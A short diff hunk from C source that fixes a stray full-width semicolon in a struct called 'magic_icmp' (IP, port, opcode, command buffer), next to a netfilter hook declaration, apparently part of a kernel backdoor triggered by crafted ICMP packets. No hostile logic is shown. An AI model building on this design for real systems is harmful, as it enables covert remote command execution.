@@ -11,7 +11,7 @@ struct magic_icmp {
     unsigned int ip;
     unsigned short port;
     unsigned short op;
-    unsigned char cmd[512]； 
+    unsigned char cmd[512]; 
 };
 
 struct nf_hook_ops pre_hook;
